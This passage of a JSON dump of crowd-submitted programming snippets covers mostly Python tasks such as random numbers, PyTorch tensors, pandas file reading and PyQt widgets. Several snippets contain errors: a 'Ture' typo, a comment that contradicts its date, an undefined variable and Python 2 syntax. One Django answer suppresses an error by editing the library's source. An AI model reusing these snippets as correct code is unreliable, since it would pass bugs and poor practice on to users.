  },
  {
    "id": 4035,
    "keyword": null,
    "link": null,
    "title": " python year month from date",
    "description": "import datetime date = '2021-05-21 11:22:03' datem = datetime.datetime.strptime(date, \"%Y-%m-%d %H:%M:%S\") print(datem.day)        # 25 print(datem.month)      # 5 print(datem.year)       # 2021 print(datem.hour)       # 11 print(datem.minute)     # 22 print(datem.second)     # 3\n",
    "reg_date": "2021-10-12T11:34:28.000Z"
  },
  {
    "id": 4036,
    "keyword": null,
    "link": null,
    "title": " python your mom",
    "description": "while true:   print('your mom is a nice person')\n",
    "reg_date": "2021-10-12T11:34:28.000Z"
  },
  {
    "id": 4037,
    "keyword": null,
    "link": null,
    "title": " python youtube search",
    "description": "from youtube_search import YoutubeSearch  results = YoutubeSearch('search terms', max_results=10).to_json()  print(results)  # returns a json string  ########################################  results = YoutubeSearch('search terms', max_results=10).to_dict()  print(results) # returns a dictionary \n",
    "reg_date": "2021-10-12T11:34:28.000Z"
  },
  {
    "id": 4038,
    "keyword": null,
    "link": null,
    "title": " python zip extract directory",
    "description": "import zipfile  archive = zipfile.ZipFile('archive.zip')  for file in archive.namelist():     if file.startswith('foo/'):         archive.extract(file, 'destination_path')\n",
    "reg_date": "2021-10-12T11:34:28.000Z"
  },
  {
    "id": 4039,
    "keyword": null,
    "link": null,
    "title": " python zip file open as text",
    "description": "with ZipFile('spam.zip') as myzip:     with myzip.open('eggs.txt') as myfile:        eggs = io.TextIOWrapper(myfile)\n",
    "reg_date": "2021-10-12T11:34:28.000Z"
  },
  {
    "id": 4040,
    "keyword": null,
    "link": null,
    "title": " python zip listas diferente tamaño",
    "description": ">>> numeros = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10] >>> letras = ['a', 'b', 'c'] >>> for numero, letra in zip(numeros, letras): ...     print(numero, letra) 1 a 2 b 3 c # Si las listas tienen distinto tama&ntilde;o, # la longitud de la salida sera la de la lista m&aacute;s peque&ntilde;a\n>>> meses = [\"marzo\", \"abril\", \"mayo\"] >>> estados = [\"ventoso\", \"lluvioso\", \"florido y hermoso\"] >>> for mes, estado in zip(meses, estados): ...     print(mes, estado) ... marzo ventoso abril lluvioso mayo florido y hermoso\n",
    "reg_date": "2021-10-12T11:34:28.000Z"
  },
  {
    "id": 4041,
    "keyword": null,
    "link": null,
    "title": " pytorch check gpu",
    "description": "In [1]: import torch  In [2]: torch.cuda.current_device() Out[2]: 0  In [3]: torch.cuda.device(0) Out[3]: <torch.cuda.device at 0x7efce0b03be0>  In [4]: torch.cuda.device_count() Out[4]: 1  In [5]: torch.cuda.get_device_name(0) Out[5]: 'GeForce GTX 950M'  In [6]: torch.cuda.is_available() Out[6]: True \nimport torch import torch.nn as nn dev = torch.device(\"cuda\") if torch.cuda.is_available() else torch.device(\"cpu\") t1 = torch.randn(1,2) t2 = torch.randn(1,2).to(dev) print(t1)  # tensor([[-0.2678,  1.9252]]) print(t2)  # tensor([[ 0.5117, -3.6247]], device='cuda:0') t1.to(dev)  print(t1)  # tensor([[-0.2678,  1.9252]])  print(t1.is_cuda) # False t1 = t1.to(dev) print(t1)  # tensor([[-0.2678,  1.9252]], device='cuda:0')  print(t1.is_cuda) # True  class M(nn.Module):     def __init__(self):                 super().__init__()                 self.l1 = nn.Linear(1,2)      def forward(self, x):                               x = self.l1(x)         return x model = M()   # not on cuda model.to(dev) # is on cuda (all parameters) print(next(model.parameters()).is_cuda) # True\nimport torch  torch.cuda.is_available() >>> True  torch.cuda.current_device() >>> 0  torch.cuda.device(0) >>> <torch.cuda.device at 0x7efce0b03be0>  torch.cuda.device_count() >>> 1  torch.cuda.get_device_name(0) >>> 'GeForce GTX 950M' \ntorch.cuda.device_count()\ndevice = torch.device(\"cuda:0\" if torch.cuda.is_available() else \"cpu\") #或device = torch.device(\"cuda:0\") device1 = torch.device(\"cuda:1\")   for batch_idx, (img, label) in enumerate(train_loader):     img=img.to(device)     label=label.to(device) \ntorch.version.cuda\n",
    "reg_date": "2021-10-12T11:34:28.000Z"
  },
  {
    "id": 4042,
    "keyword": null,
    "link": null,
    "title": " pytorch plt.imshow",
    "description": "plt.imshow(images[0].permute(1, 2, 0))\n",
    "reg_date": "2021-10-12T11:34:28.000Z"
  },
  {
    "id": 4043,
    "keyword": null,
    "link": null,
    "title": " pytorch save model",
    "description": "Saving: \ttorch.save(model, PATH)   Loading:  \tmodel = torch.load(PATH) \tmodel.eval()      A common PyTorch convention is to save models using either a .pt or .pth file extension.\nSaving: \ttorch.save(model, PATH)   Loading:  \tmodel = torch.load(PATH) \tmodel.eval()\nimport dill  model_copy=dill.dumps(model) torch.save(model_copy,&lsquo;model_ignite_original.pt&rsquo;)  model1 = torch.load(model_name) model=dill.loads(model1)\n",
    "reg_date": "2021-10-12T11:34:28.000Z"
  },
  {
    "id": 4044,
    "keyword": null,
    "link": null,
    "title": " pytorch summary model",
    "description": "from torchsummary import summary help(summary) import torchvision.models as models alexnet = models.alexnet(pretrained=False) alexnet.cuda() summary(alexnet, (3, 224, 224)) print(alexnet)\n",
    "reg_date": "2021-10-12T11:34:29.000Z"
  },
  {
    "id": 4045,
    "keyword": null,
    "link": null,
    "title": " pytorch tensor add one dimension",
    "description": "# ADD ONE DIMENSION: .unsqueeze(dim)  my_tensor = torch.tensor([1,3,4]) # tensor([1,3,4])  my_tensor.unsqueeze(0) # tensor([[1,3,4]])  my_tensor.unsqueeze(1) # tensor([[1], #         [3], #         [4]]) \n",
    "reg_date": "2021-10-12T11:34:29.000Z"
  },
  {
    "id": 4046,
    "keyword": null,
    "link": null,
    "title": " pytorch tensor change dimension order",
    "description": "a = torch.rand(1,2,3,4) print(a.transpose(0,3).transpose(1,2).size()) print(a.permute(3,2,1,0).size())\n",
    "reg_date": "2021-10-12T11:34:29.000Z"
  },
  {
    "id": 4047,
    "keyword": null,
    "link": null,
    "title": " pytz timezone list",
    "description": "import pytz for tz in pytz.all_timezones:     print tz\n",
    "reg_date": "2021-10-12T11:34:29.000Z"
  },
  {
    "id": 4048,
    "keyword": null,
    "link": null,
    "title": " pyvenv.cfg file download",
    "description": "# CREATE FOLDER FOR A PROJECT mkdir project_folder cd project_folder  # CREATE VIRTUAL ENVIRONMENT python3.7 -m venv myvenv  # or alternativelly virtualenv myvenv --python=python3.7  # ACTIVATE VIRTUAL ENVIRONMENT source myvenv/bin/activate\n",
    "reg_date": "2021-10-12T11:34:29.000Z"
  },
  {
    "id": 4049,
    "keyword": null,
    "link": null,
    "title": " pyyaml install",
    "description": "pip install PyYAML\n",
    "reg_date": "2021-10-12T11:34:29.000Z"
  },
  {
    "id": 4050,
    "keyword": null,
    "link": null,
    "title": " qTextEdit get text",
    "description": "textboxValue = self.textbox.toPlainText()\n",
    "reg_date": "2021-10-12T11:34:29.000Z"
  },
  {
    "id": 4051,
    "keyword": null,
    "link": null,
    "title": " q is not defined pylance django",
    "description": "from django.db.models import Q\n",
    "reg_date": "2021-10-12T11:34:29.000Z"
  },
  {
    "id": 4052,
    "keyword": null,
    "link": null,
    "title": " qpushbutton text alignment",
    "description": "text-align:left;\n",
    "reg_date": "2021-10-12T11:34:29.000Z"
  },
  {
    "id": 4053,
    "keyword": null,
    "link": null,
    "title": " qradiobutton example",
    "description": "# import it from PyQt5.QtWidgets and radioBtn=QRadioButton(\"Button1\") radioBtn.toggled.connect(lambda:self.myMethod())  # Example is at link below: ''' https://gist.github.com/Orizzu/fbbd473becb6d7f1a598c12915f37c52 '''\n",
    "reg_date": "2021-10-12T11:34:29.000Z"
  },
  {
    "id": 4054,
    "keyword": null,
    "link": null,
    "title": " qspinbox disable wheel python",
    "description": "from PyQt5 import QtWidgets  box = QtWidgets.QSpinBox() box.wheelEvent = lambda event: None\n",
    "reg_date": "2021-10-12T11:34:30.000Z"
  },
  {
    "id": 4055,
    "keyword": null,
    "link": null,
    "title": " quadratic equation solver python",
    "description": "# Solve the quadratic equation ax**2 + bx + c = 0  # import complex math module import cmath  a = 1 b = 5 c = 6  # calculate the discriminant d = (b**2) - (4*a*c)  # find two solutions sol1 = (-b-cmath.sqrt(d))/(2*a) sol2 = (-b+cmath.sqrt(d))/(2*a)  print('The solution are {0} and {1}'.format(sol1,sol2))\ndef square(n):   num=n   newnum=n*n   return newnum   \n",
    "reg_date": "2021-10-12T11:34:30.000Z"
  },
  {
    "id": 4056,
    "keyword": null,
    "link": null,
    "title": " rabbitmq pika username password",
    "description": "#!/usr/bin/env python import pika  credentials = pika.PlainCredentials('the_user', 'the_pass') parameters = pika.ConnectionParameters('132.45.23.14',                                    5672,                                    '/',                                    credentials)  connection = pika.BlockingConnection(parameters)  channel = connection.channel()  channel.queue_declare(queue='hello', durable=Ture)  channel.basic_publish(exchange='',                   routing_key='hello',                   body='Hello W0rld!') print(\" [x] Sent 'Hello World!'\") connection.close() \n",
    "reg_date": "2021-10-12T11:34:30.000Z"
  },
  {
    "id": 4057,
    "keyword": null,
    "link": null,
    "title": " radio button pyqt",
    "description": "# import it from PyQt5.QtWidgets and radioBtn=QRadioButton(\"Button1\") radioBtn.toggled.connect(lambda:self.myMethod())  # Example is at link below: ''' https://gist.github.com/Orizzu/fbbd473becb6d7f1a598c12915f37c52 '''\n",
    "reg_date": "2021-10-12T11:34:30.000Z"
  },
  {
    "id": 4058,
    "keyword": null,
    "link": null,
    "title": " raise RuntimeError(\"populate() isn't reentrant\")",
    "description": "#django/apps/registery.py #replace raise RuntimeError(\"populate() isn't reentrant\") with: self.app_configs = {}\n",
    "reg_date": "2021-10-12T11:34:30.000Z"
  },
  {
    "id": 4059,
    "keyword": null,
    "link": null,
    "title": " raise TemplateDoesNotExist(template name, chain=chain) django.template.exceptions.TemplateDoesNotExist: home.html",
    "description": "//check your settings.py has below configuration INSTALLED_APPS = ['your_app_name']\n",
    "reg_date": "2021-10-12T11:34:30.000Z"
  },
  {
    "id": 4060,
    "keyword": null,
    "link": null,
    "title": " raise XLRDError(FILE FORMAT DESCRIPTIONS[file format]+'; not supported') xlrd.biffh.XLRDError: Excel xlsx file; not supported",
    "description": "pip install xlrd==1.2.0 \ndf1 = pd.read_excel(      os.path.join(APP_PATH, \"Data\", \"aug_latest.xlsm\"),      engine='openpyxl', )\n",
    "reg_date": "2021-10-12T11:34:30.000Z"
  },
  {
    "id": 4061,
    "keyword": null,
    "link": null,
    "title": " random boolean python",
    "description": "bool(random.getrandbits(1)) #is still about twice as fast as random.choice([True, False])\nimport random bool(random.getrandbits(1))\n",
    "reg_date": "2021-10-12T11:34:30.000Z"
  },
  {
    "id": 4062,
    "keyword": null,
    "link": null,
    "title": " random date python",
    "description": "from random import randrange from datetime import timedelta  def random_date(start, end):     delta = end - start     int_delta = (delta.days * 24 * 60 * 60) + delta.seconds     random_second = randrange(int_delta)     return start + timedelta(seconds=random_second)  from datetime import datetime d1 = datetime.strptime('1/1/2008 1:30 PM', '%m/%d/%Y %I:%M %p') d2 = datetime.strptime('1/1/2009 4:50 AM', '%m/%d/%Y %I:%M %p') print(random_date(d1, d2))  \n",
    "reg_date": "2021-10-12T11:34:30.000Z"
  },
  {
    "id": 4063,
    "keyword": null,
    "link": null,
    "title": " random float python",
    "description": ">>> random.uniform(1.5, 1.9) 1.8733202628557872 \n>>> random.uniform(1.5, 1.9) 1.8733202628557872\n# To create a list of random float numbers: import numpy random_float_array = numpy.random.uniform(75.5, 125.5, 2) # Output: # [107.50697835, 123.84889979]\nfrom random import randint  print(randint(1,3))  #Possible Outputs# #1 #2 #3\n# The random function random() returns a random float between # zero and one import random random.random()\nfrom random import randint # Import randint from random print(randint(1,20)) # Gets random number from first parameter to the second\n",
    "reg_date": "2021-10-12T11:34:30.000Z"
  },
  {
    "id": 4064,
    "keyword": null,
    "link": null,
    "title": " random forest python stack overflow",
    "description": "from sklearn.ensemble import RandomForestClassifier from numpy import genfromtxt, savetxt  def main():     #create the training & test sets, skipping the header row with [1:]     dataset = genfromtxt(open('Data/train.csv','r'), delimiter=',', dtype='f8')[1:]         target = [x[0] for x in dataset]     train = [x[1:] for x in dataset]     test = genfromtxt(open('Data/test.csv','r'), delimiter=',', dtype='f8')[1:]      #create and train the random forest     #multi-core CPUs can use: rf = RandomForestClassifier(n_estimators=100, n_jobs=2)     rf = RandomForestClassifier(n_estimators=100)     rf.fit(train, target)      savetxt('Data/submission2.csv', rf.predict(test), delimiter=',', fmt='%f')  if __name__==\"__main__\":     main() \n",
    "reg_date": "2021-10-12T11:34:31.000Z"
  },
  {
    "id": 4065,
    "keyword": null,
    "link": null,
    "title": " random forest regressor python",
    "description": "from sklearn.ensemble import RandomForestRegressor   clf = RandomForestRegressor(max_depth=2, random_state=0)  clf.fit(X, y)  print(clf.predict([[0, 0, 0, 0]]))\n",
    "reg_date": "2021-10-12T11:34:31.000Z"
  },
  {
    "id": 4066,
    "keyword": null,
    "link": null,
    "title": " random int in python 3",
    "description": "from random import randint    print(randint(1, 10))  # prints a random integer from 1 to 10\n",
    "reg_date": "2021-10-12T11:34:31.000Z"
  },
  {
    "id": 4067,
    "keyword": null,
    "link": null,
    "title": " random letter generator python",
    "description": "import random import string random.choice(string.ascii_letters)\nimport random import string  def get_random_alphanumeric_string(length):     letters_and_digits = string.ascii_letters + string.digits     result_str = ''.join((random.choice(letters_and_digits) for i in range(length)))     print(\"Random alphanumeric String is:\", result_str)  get_random_alphanumeric_string(8) get_random_alphanumeric_string(8) \n# -random letter generator- import string var1 = string.ascii_letters  import random var2 = random.choice(string.ascii_letters) print(var2)\n",
    "reg_date": "2021-10-12T11:34:31.000Z"
  },
  {
    "id": 4068,
    "keyword": null,
    "link": null,
    "title": " random name generator in python",
    "description": "import namegenerator #First Do pip install namegenerator  #The Import it print (namegenerator.gen())\nimport random import time  print('WARNING: If you want less than 10 names, too bad you cant. Just lower the name count.')  name1 = input('please enter the first name: ') print(' ') name2 = input('please enter the second name: ') print(' ') name3 = input('please enter the third name: ') print(' ') name4 = input('please enter the fourth name: ') print(' ') name5 = input('please enter the fith name: ') print(' ') name6 = input('please enter the sixth name: ') print(' ') name7 = input('please enter the seventh name: ') print(' ') name8 = input('please enter the eighth name: ') print(' ') name9 = input('please enter the nineth name: ') print(' ') name10 = input('please enter the tenth name: ') print(' ')  Name_list = [name1, name2, name3, name4, name5, name6, name7, name8, name9, name10]  def ask():     global start    print(' ')   start = input('plese enter y to continue: ')   print(' ')  ask()  if(start == 'y'):   print('Generating...')   time.sleep(1.25)   print(' ')   print('Generated!')   print(' ')   print('Random Name Generated: ')   print(random.choice(Name_list))   print(' ') elif(start != 'y'):   print(' ')   ask()   print(' ') \n",
    "reg_date": "2021-10-12T11:34:31.000Z"
  },
  {
    "id": 4069,
    "keyword": null,
    "link": null,
    "title": " random number guessing game python",
    "description": "import random print(\"Welcome to random number gusser game\") print(\"I will guss number from 1 to 100 \") Difficulty = str(input(\"What is your difficulty Easy or hard:- \")).lower() def difficiulty(Difficulty):     random_number = random.randint(1,100)     if Difficulty == \"easy\":         print(\"you will get 10 chances\")         chances = 10         while True:             number_choosen = int(input(\"Guss the number now:- \"))             if number_choosen != random_number:                 chances -= 1                 if chances == 0:                     return \"You Lost\"                     break                 else:                     print(\"Not correct number\")             else:                 return \"you won\"     elif Difficulty == \"hard\":         chances = 5         print(\"You will get 5 chances\")         while True:             number_choosen = int(input(\"Guss the number now:- \"))             if number_choosen != random_number:                 chances -= 1                 if chances == 0:                     return \"You Lost\"             else:                 return \"You Won\" print(difficiulty(Difficulty))\n",
    "reg_date": "2021-10-12T11:34:31.000Z"
  },
  {
    "id": 4070,
    "keyword": null,
    "link": null,
    "title": " random number pythn",
    "description": "# generate random integer values from random import randint  value = randint(0, 10) print(value) \nimport random n = random.randint(0,22) print(n)  # Output: 2\nfrom random import randint  radnom_number = randint(1, 10) # generate random number from 1 to 10. including 10  print(radnom_number)  # Possible outputs # 1 # 2 # 3 # 4 # 5 # 6 # 7 # 8 # 9 # 10\n",
    "reg_date": "2021-10-12T11:34:31.000Z"
  },
  {
    "id": 4071,
    "keyword": null,
    "link": null,
    "title": " random number python",
    "description": "# generate random integer values from random import randint  value = randint(0, 10) print(value) \nfrom random import randint  print(randint(1,5))  ##Possible Outputs## #1 #2 #3 #4 #5\n# To create a list of random integer values: import random randomlist = random.sample(range(10, 30), 5) # Output: # [16, 19, 13, 18, 15]  # To create a list of random float numbers: import numpy random_float_array = numpy.random.uniform(75.5, 125.5, 2) # Output: # [107.50697835, 123.84889979]\n# imports random import random # randint generates a random integar between the first parameter and the second print(random.randint(1, 100))\nimport random n = random.randint(0,22) print(n)\nimport random num = random.randint(1, 10) # put any number print(num)\n",
    "reg_date": "2021-10-12T11:34:31.000Z"
  },
  {
    "id": 4072,
    "keyword": null,
    "link": null,
    "title": " random numbers in python",
    "description": "# generate random integer values from random import randint  value = randint(0, 10) print(value) \nfrom random import randint  print(randint(1,5))  ##Possible Outputs## #1 #2 #3 #4 #5\n# imports random import random # randint generates a random integar between the first parameter and the second print(random.randint(1, 100))\nimport random n = random.randint(0,22) print(n)\n# generate random integer values from random import seed from random import randint # seed random number generator seed(1) # generate some integers for _ in range(10): \tvalue = randint(0, 10) \tprint(value) \nimport random  randomNumber = random.randint(1, 100) print(randomNumber)\n",
    "reg_date": "2021-10-12T11:34:31.000Z"
  },
  {
    "id": 4073,
    "keyword": null,
    "link": null,
    "title": " random password generator in python project",
    "description": "import string from random import * characters = string.ascii_letters + string.punctuation  + string.digits password =  \"\".join(choice(characters) for x in range(randint(8, 16))) print password \nimport random chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@&pound;$%^&*().,?0123456789'  number = input('Please enter a number of passwords.') try:     number = int(number) except:     print(\"Error, please enter a number!\")  length = input('Length of password?') try:     length = int(length) except:     print(\"Error, please enter a number!\")  print('\\nHere are your password(s):')  for pwd in range(number):   password = ''   for c in range(length):     password += random.choice(chars)   print(password)\nimport random  alph = list('ABCDEFGHIJKLMNOPQRSTUVWXYZ\\              abcdefghijklmnopqrstuvwxyz\\              1234567890 !@#$%^&*(){}[]<>,.') out = '' for char in string:     out += random.choice(alph)      print(out)\n#This is giving you a password with 8 strings and 4 numbers: import random i=0  list=[] while i < 12:     while i < 8:         list.append(random.choice(string.ascii_letters))         i+=1     while i < 12:         list.append(random.randint(0, 9))         i+=1      list=' '.join([str(elem) for elem in list]) print(\"Your new password: \", list.replace(\" \", \"\"))\nimport random import string  x = str(input(\"Do you want a password? y/n \"))  list = [] if x == \"y\":     print(\"Alright!\")     for i in range(16):         _1 = random.choice(string.ascii_letters)         _2 = random.randint(1, 9)         list.append(_1)         list.append(_2) else:     print(\"ok\")   def convert(list):             s = [str(i) for i in list]             res = \"\".join(s)             return(print(res))    convert(list)  \nimport random letters = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'] numbers = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'] symbols = ['!', '#', '$', '%', '&', '(', ')', '*', '+'] print(\"Welcome to the PyPassword Generator!\") nr_letters = int(input(\"How many letters would you like in your password?\\n\"))  nr_symbols = int(input(f\"How many symbols would you like?\\n\")) nr_numbers = int(input(f\"How many numbers would you like?\\n\")) password_list = [] for char in range(1, nr_letters + 1):   password_list.append(random.choice(letters)) for char in range(1, nr_symbols + 1):   password_list += random.choice(symbols) for char in range(1, nr_numbers + 1):   password_list += random.choice(numbers)  random.shuffle(password_list) password = \"\" for char in password_list:   password += char print(f\"Your password is: {password}\")\n",
    "reg_date": "2021-10-12T11:34:31.000Z"
  },
  {
    "id": 4074,
    "keyword": null,
    "link": null,
    "title": " random password generator python",
    "description": "import random import string random.choice(string.ascii_letters)\nimport string from random import * characters = string.ascii_letters + string.punctuation  + string.digits password =  \"\".join(choice(characters) for x in range(randint(8, 16))) print password \nimport random chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@&pound;$%^&*().,?0123456789'  number = input('Please enter a number of passwords.') try:     number = int(number) except:     print(\"Error, please enter a number!\")  length = input('Length of password?') try:     length = int(length) except:     print(\"Error, please enter a number!\")  print('\\nHere are your password(s):')  for pwd in range(number):   password = ''   for c in range(length):     password += random.choice(chars)   print(password)\nimport secrets  secrets.token_hex(nbytes=16)  # this will produce something like  # aa82d48e5bff564f3221d02194611c13\nimport string import random  length=5 #python2 randomstr = ''.join(random.sample(string.ascii_letters+string.digits,length))   #python3 randomstr = ''.join(random.choices(string.ascii_letters+string.digits,k=length))                                    \nimport random  alph = list('ABCDEFGHIJKLMNOPQRSTUVWXYZ\\              abcdefghijklmnopqrstuvwxyz\\              1234567890 !@#$%^&*(){}[]<>,.') out = '' for char in string:     out += random.choice(alph)      print(out)\n",
    "reg_date": "2021-10-12T11:34:32.000Z"
  },
  {
    "id": 4075,
    "keyword": null,
    "link": null,
    "title": " random python",
    "description": "# generate random integer values from random import randint  value = randint(0, 10) print(value) \n>>> random.uniform(1.5, 1.9) 1.8733202628557872\n# imports random import random # randint generates a random integar between the first parameter and the second print(random.randint(1, 100))\n#import random  import random  names = ['Harry', 'John', 'Smith', 'Larry']  #print random name from names print(random.choice(names))  #print random integer in a range of numbers print(random.randint(1, 100)\nfrom random import randint randint(0,5)#0<=randomNumber<=5\nfrom random import randint  print(randint(1,3))  #Possible Outputs# #1 #2 #3\n",
    "reg_date": "2021-10-12T11:34:32.000Z"
  },
  {
    "id": 4076,
    "keyword": null,
    "link": null,
    "title": " random word generator python",
    "description": "#First pip install random-word from random_word import RandomWords r = RandomWords()  # Return a single random word r.get_random_word() # Return list of Random words r.get_random_words() # Return Word of the day r.word_of_the_day() \n#easy random word generator import random words = (\"Rock\", \"Paper\", \"scissor\") word = random.choice(words) correct = word print(word)\nfrom RandomWordGenerator import RandomWord  # Creating a random word object rw = RandomWord(max_word_size,                 constant_word_size=True,                 include_digits=False,                 special_chars=r\"@_!#$%^&*()<>?/\\|}{~:\",                 include_special_chars=False) \nOutput will be some random word like > gw \n",
    "reg_date": "2021-10-12T11:34:32.000Z"
  },
  {
    "id": 4077,
    "keyword": null,
    "link": null,
    "title": " range of letters python",
    "description": "for i in range(ord('a'), ord('z') + 1):   print(chr(i))   # prints all letters in english the alphabet\n    a = ord('a')     alph = [chr(i) for i in range(a, a+26)]\n",
    "reg_date": "2021-10-12T11:34:32.000Z"
  },
  {
    "id": 4078,
    "keyword": null,
    "link": null,
    "title": " ranking in python",
    "description": "def rank_giver(Numbers):     first = 0     second = 0     third = 0     for num in Numbers:         if num > third:           third = num         if third > second:             temp = second             second = third             third = temp         if second > first:             temp = first             first = second                                                        second = temp                  return first,second,third  print(rank_giver([10, 20, 50, 99]))\n",
    "reg_date": "2021-10-12T11:34:32.000Z"
  },
  {
    "id": 4079,
    "keyword": null,
    "link": null,
    "title": " raylib python",
    "description": "from raylib.static import *  InitWindow(800, 450, b\"Hello Raylib\") SetTargetFPS(60)  camera = ffi.new(\"struct Camera3D *\", [[18.0, 16.0, 18.0], [0.0, 0.0, 0.0], [0.0, 1.0, 0.0], 45.0, 0]) SetCameraMode(camera[0], CAMERA_ORBITAL)  while not WindowShouldClose():     UpdateCamera(camera)     BeginDrawing()     ClearBackground(RAYWHITE)     BeginMode3D(camera[0])     DrawGrid(20, 1.0)     EndMode3D()     DrawText(b\"Hellow World\", 190, 200, 20, VIOLET)     EndDrawing() CloseWindow()  \npip install raylib\n",
    "reg_date": "2021-10-12T11:34:32.000Z"
  },
  {
    "id": 4080,
    "keyword": null,
    "link": null,
    "title": " reached 'max' / getOption(\"max.print\")",
    "description": "options(max.print=1000000)\n",
    "reg_date": "2021-10-12T11:34:32.000Z"
  },
  {
    "id": 4081,
    "keyword": null,
    "link": null,
    "title": " read .dat python",
    "description": "import numpy as np sed = np.loadtxt('spectra.dat', unpack = True)  \n",
    "reg_date": "2021-10-12T11:34:32.000Z"
  },
  {
    "id": 4082,
    "keyword": null,
    "link": null,
    "title": " read csv as list python",
    "description": "import csv  with open('file.csv', newline='') as f:     reader = csv.reader(f)     data = list(reader)  print(data) \n",
    "reg_date": "2021-10-12T11:34:32.000Z"
  },
  {
    "id": 4083,
    "keyword": null,
    "link": null,
    "title": " read data from excel and plot in python",
    "description": "import pandas as pd import matplotlib.pyplot as plt data = pd.read_excel('C:/Users/user/Documents/JCI.xlsx') data.plot() plt.show()\n",
    "reg_date": "2021-10-12T11:34:32.000Z"
  },
  {
    "id": 4084,
    "keyword": null,
    "link": null,
    "title": " read database pandas",
    "description": "from sqlalchemy import create_engine  engine = create_engine(\"sqlite:///data.db\")  query = \"\"\" SELECT *    FROM weather; \"\"\"  weather = pd.read_sql(query, engine)\n",
    "reg_date": "2021-10-12T11:34:32.000Z"
  },
  {
    "id": 4085,
    "keyword": null,
    "link": null,
    "title": " read excel date in python",
    "description": "data = pd.read_excel(r'File_Path', parse_dates=['Date_Column'])\n",
    "reg_date": "2021-10-12T11:34:33.000Z"
  },
  {
    "id": 4086,
    "keyword": null,
    "link": null,
    "title": " read excel sheet in python",
    "description": "df = pd.read_excel('Path.xlsx', sheet_name='Desired Sheet Name')\nimport pandas as pd  df = pd.read_excel (r'Path where the Excel file is stored\\File name.xlsx', sheet_name='your Excel sheet name') print (df) \nxl = pd.ExcelFile('foo.xls')  xl.sheet_names\nimport pandas as pd  df = pd.read_excel (r'Path where the Excel file is stored\\File name.xlsx')\nimport pandas as pd  df = pd.read_excel (r'Path where the Excel file is stored\\File name.xlsx') print (df) \nimport os from pathlib import Path # opening EXCEL through Code \t\t\t\t\t#local path in dir absolutePath = Path('../excel.xlsx').resolve() os.system(f'start excel.exe \"{absolutePath}\"')\n",
    "reg_date": "2021-10-12T11:34:33.000Z"
  },
  {
    "id": 4087,
    "keyword": null,
    "link": null,
    "title": " read json file python utf8",
    "description": "with open('keys.json', encoding='utf-8') as fh:     data = json.load(fh)  print(data) # from stackoverflow : https://stackoverflow.com/questions/46408051/python-json-load-set-encoding-to-utf-8\n",
    "reg_date": "2021-10-12T11:34:33.000Z"
  },
  {
    "id": 4088,
    "keyword": null,
    "link": null,
    "title": " read shp in python",
    "description": "import geopandas as gpd shapefile = gpd.read_file(\"shapefile.shp\") print(shapefile)\n",
    "reg_date": "2021-10-12T11:34:33.000Z"
  },
  {
    "id": 4089,
    "keyword": null,
    "link": null,
    "title": " read text file in python",
    "description": "with open (\"data.txt\", \"r\") as myfile:     data = myfile.read().splitlines() \nwith open(\"file.txt\", \"r\") as txt_file:   return txt_file.readlines()\nfile = '/home/text/chapter001.txt' f=open(file,'r') data = f.read() print('data =',data)\n# Basic syntax: with open('/path/to/filename.extension', 'open_mode') as filename:   file_data = filename.readlines()\t# Or filename.read()  # Where: #\t- open imports the file as a file object which then needs to be read #\t\twith one of the read options #\t- readlines() imports each line of the file as an element in a list #\t- read() imports the file contents as one long new-line-separated  #\t\tstring #\t- open_mode can be one of: #\t\t- \"r\" = Read which opens a file for reading (error if the file  #\t\t\tdoesn't exist) #\t\t- \"a\" = Append which opens a file for appending (creates the  #\t\t\tfile if it doesn't exist) #\t\t- \"w\" = Write which opens a file for writing (creates the file  #\t\t\tif it doesn't exist) #\t\t- \"x\" = Create which creates the specified file (returns an error #\t\t\tif the file exists) # Note, \"with open() as\" is recommended because the file is closed  #\tautomatically so you don't have to remember to use file.close()  # Basic syntax for a delimited file with multiple fields: import csv with open('/path/to/filename.extension', 'open_mode') as filename: \tfile_data = csv.reader(filename, delimiter='delimiter')     data_as_list = list(file_data) # Where: #\t- csv.reader can be used for files that use any delimiter, not just #\t\tcommas, e.g.: '\\t', '|', ';', etc. (It's a bit of a misnomer) #\t- csv.reader() returns a csv.reader object which can be iterated  #\t\tover, directly converted to a list, and etc.   # Importing data using Numpy: import numpy as np data = np.loadtxt('/path/to/filename.extension', \t\t\t\tdelimiter=',', \t# String used to separate values \t\t\t\tskiprows=2, \t# Number of rows to skip \t\t\t\tusecols=[0,2], \t# Specify which columns to read \t\t\t\tdtype=str) \t\t# The type of the resulting array  # Importing data using Pandas: import pandas as pd data = pd.read_csv('/path/to/filename.extension', \t\t\t\tnrows=5, \t\t# Number of rows of file to read \t\t\t\theader=None, \t# Row number to use as column names  \t            sep='\\t', \t\t# Delimiter to use  \t            comment='#', \t# Character to split comments \t\t\t\tna_values=[\"\"])\t# String to recognize as NA/NaN  # Note, pandas can also import excel files with pd.read_excel()\nf=open(\"Diabetes.txt\",'r') f.read()\nf = open(\"welcome.txt\", \"r\") print(f.read())  f.close()\n",
    "reg_date": "2021-10-12T11:34:33.000Z"
  },
  {
    "id": 4090,
    "keyword": null,
    "link": null,
    "title": " read tsv file column",
    "description": "#for example you have 4 column age,gender,name,adress  #if you want to gender you should give \"line[1]\" for arraylist with open(\"train.tsv\",encoding='utf8') as tsvfile:     tsvreader = csv.reader(tsvfile, delimiter=\"\\t\")     for line in tsvreader:         print(line[1])\n",
    "reg_date": "2021-10-12T11:34:33.000Z"
  },
  {
    "id": 4091,
    "keyword": null,
    "link": null,
    "title": " read txt file pandas",
    "description": "df = pd.read_csv('output_list.txt', sep=\" \", header=None, names=[\"a\", \"b\", \"c\"])\ndf = pd.read_csv('output_list.txt', sep=\" \", header=None, names=[\"a\", \"b\", \"c\"])  data = pd.read_csv('output_list.txt', sep=\" \", header=None) data.columns = [\"a\", \"b\", \"c\", \"etc.\"]\ndata = pd.read_csv('output_list.txt', sep=\" \", header=None) data.columns = [\"a\", \"b\", \"c\", \"etc.\"]\n",
